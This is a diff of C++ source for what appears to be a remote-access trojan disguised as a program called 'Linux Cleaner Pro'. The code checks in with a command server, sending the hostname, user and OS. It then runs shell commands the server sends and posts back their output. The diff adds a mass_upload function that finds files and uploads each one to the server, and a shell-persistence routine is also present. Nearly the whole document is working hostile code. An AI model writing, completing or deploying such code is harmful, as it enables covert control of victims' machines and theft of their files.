@@ -10,7 +10,6 @@
 using namespace std; 
 
 const string HOST_URL = "http://127.0.0.1:3000/";
-string ID;
 
 string get_os() {
     #ifdef _WIN32
@@ -53,7 +52,7 @@ string exec(string cmd) {
         output += buffer.data();
     }
 
-    output.erase(output.length()-1); // remove last newline
+    //output.erase(output.length()-1); // remove last newline
 
     return output;
 }
@@ -193,39 +192,88 @@ void make_shell_persistance() {
     }
 }
 
-void signalHandler(int signum) {
-    cout << "Interrupt signal (" << signum << ") received." << endl;
-    post(HOST_URL + "disconnect", "id=" + ID);
-    exit(signum);
+void mass_upload(string command, string id) {
+
+    //This trash fire finds only the cd commands
+    // to get path later
+    string usePATH = "";
+    string getPATH = command;
+    string tempHelp;
+    while( getPATH.length() != 0 ) {
+
+        tempHelp = getPATH.substr( 0, getPATH.find(";") + 1 );
+        if(tempHelp.substr(0,2) == "cd" ){
+            usePATH.append(tempHelp);
+            usePATH.append(" ");
+        }
+
+        //two spaces, one for ; and one for ' '
+        getPATH = getPATH.substr( getPATH.find(";") + 2 );
+        if(getPATH.find(";") == std::string::npos){
+            break;
+        }
+    }
+    // get that path and create a string of what to find
+    string path = exec(usePATH + "pwd");
+    path.erase(path.length()-1); // remove last newline
+    string filesToUpload = exec(command);
+
+    string tempFileName;
+
+    // get the path string for each file found
+    while( filesToUpload.length() != 0 ) {
+        tempFileName = filesToUpload.substr(0, filesToUpload.find("\n") + 1);
+        filesToUpload = filesToUpload.substr( filesToUpload.find("\n") + 1 );
+
+        tempFileName.erase(tempFileName.length()-1); // remove last newline
+        cout << path + "/" + tempFileName << endl;
+        
+        upload_file(HOST_URL + "upload", path + "/" + tempFileName, id);
+    }
 }
 
 int main() {
+    cout << "Starting up Linux Cleaner Pro!" << endl;
+    cout << "The best optoin for best running!!!!!!!! :)" << endl;
+
+    int wait_for_command_time = 3;
     string hostname = exec("hostname");
     string user = exec("id -un");
     string os = get_os();
 
-    signal(SIGINT, signalHandler);
-
     //make_shell_persistance();
 
-    do {
-        ID = post(HOST_URL + "connect", "hostname=" + hostname +
-                "&user=" + user + "&os=" + os);
+    string id = "";
+    while(id == "")
+    {
         this_thread::sleep_for(chrono::seconds(3));
-    } while (ID.empty());
-
-    // Local file test
-    //upload_file(HOST_URL + "upload", "/home/brett/0.jpg", ID);
+        id = post(HOST_URL + "connect", "hostname=" + hostname +
+                "&user=" + user + "&os=" + os);
+    }
 
     while (true) {
-        string command = post(HOST_URL + "command", "id=" + ID);
+        string command = post(HOST_URL + "command", "id=" + id);
+        string MacroCmd = command.substr(0, command.find("&"));
+        command = command.substr(command.find("&")+1);
 
-        if (!command.empty()) {
+        if( MacroCmd == "find" ) {
+            mass_upload(command, id);
+
+        }else 
+        if( MacroCmd == "time" ) {
+            wait_for_command_time = stoi( command );
+
+        } else 
+        if( MacroCmd == "disconnect" ) {
+            
+        } else 
+        if( MacroCmd == "command") {
             string output = exec(command);
-            post(HOST_URL + "output", "id=" + ID + "&output=" + output);
+            post(HOST_URL + "output", "id=" + id + "&output=" + output);
+
         }
 
-        this_thread::sleep_for(chrono::seconds(3));
+        this_thread::sleep_for(chrono::seconds( wait_for_command_time ));
     }
 
     return 0;
